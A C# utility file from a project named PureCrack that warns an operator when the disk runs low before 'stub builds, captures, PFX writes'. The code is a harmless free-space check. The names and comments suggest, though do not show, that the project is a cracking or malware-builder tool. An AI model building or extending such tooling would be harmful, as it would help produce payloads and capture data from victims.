using System;
using System.IO;
using PureCrack.Util;

namespace PureCrack.Util;

/// <summary>
/// Low-disk-space guard. Checks available free space before critical writes
/// (stub builds, captures, PFX writes) and logs a warning once per threshold
/// breach so the operator sees it without console spam. Not fatal — the write
/// still proceeds, because a stub or capture lost to a full disk is better
/// than one never attempted. The warning gives the operator a chance to free
/// space before things get worse.
/// </summary>
internal static class DiskGuard
{
    private const long WarnBelowBytes = 100 * 1024 * 1024; // 100 MB
    private static int _lastWarningMinute = -1;

    /// <summary>
    /// Log a warning if the workspace drive has less than 100 MB free.
    /// Rate-limited to one warning per clock minute so repeated writes
    /// during a build don't flood the console with identical messages.
    /// </summary>
    public static void WarnIfLow(string? path = null)
    {
        try
        {
            var checkPath = path ?? Workspace.Root;
            var root = Path.GetPathRoot(checkPath);
            if (root == null) return;

            var drive = new DriveInfo(root);
            if (!drive.IsReady) return;

            if (drive.AvailableFreeSpace >= WarnBelowBytes) return;

            // Rate-limit to 1 warning per clock minute. The scenario is
            // a full build writing multiple files in rapid succession —
            // one warning is enough to alert without spam.
            var thisMinute = (int)(DateTime.UtcNow.Ticks / TimeSpan.TicksPerMinute);
            if (thisMinute == _lastWarningMinute) return;
            _lastWarningMinute = thisMinute;

            Log.Warn($"disk: only {drive.AvailableFreeSpace / (1024 * 1024)} MB free on {root} — " +
                     "captures or stubs may fail if disk fills");
        }
        catch
        {
            // DriveInfo can fail on network drives, subst drives, etc.
            // If we can't check, proceed — the write will fail on its own.
        }
    }
}
